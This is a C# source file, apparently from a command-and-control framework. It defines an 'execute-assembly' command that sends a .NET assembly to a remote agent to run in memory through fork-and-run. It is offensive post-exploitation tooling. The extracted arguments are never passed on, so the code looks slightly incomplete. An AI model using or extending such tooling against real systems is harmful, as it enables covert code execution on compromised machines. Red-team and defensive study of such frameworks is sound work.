using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Commander.Commands.Agent.EndPoint;
using Common;
using Common.Payload;
using Shared;

namespace Commander.Commands.Agent.Execute
{
    public class ExecuteAssemblyCommand : SimpleEndPointCommand
    {
        public override string Description => "Execute a dot net assembly in memory with Fork And Run mechanism";
        public override string Category => CommandCategory.Execution;
        public override string Name => "execute-assembly";
        public override CommandId CommandId => CommandId.ForkAndRun;

        protected override async void InnerExecute(CommandContext context)
        {
            var agent = context.Executor.CurrentAgent;

            var args = context.CommandParameters.GetArgs();
            if (args.Length == 0)
            {
                context.Terminal.WriteLine($"Usage : {this.Name} ExePath [Arguments]");
                return;
            }

            var exePath = args[0];

            if (!File.Exists(exePath))
            {
                context.Terminal.WriteError($"File {exePath} not found");
                return;
            }

            var prms = context.CommandParameters.ExtractAfterParam(0).Trim();
         
            context.AddParameter(ParameterId.Name, Path.GetFileName(exePath));
            context.AddParameter(ParameterId.Output, true);

            base.CallEndPointCommand(context);

        }
    }
}
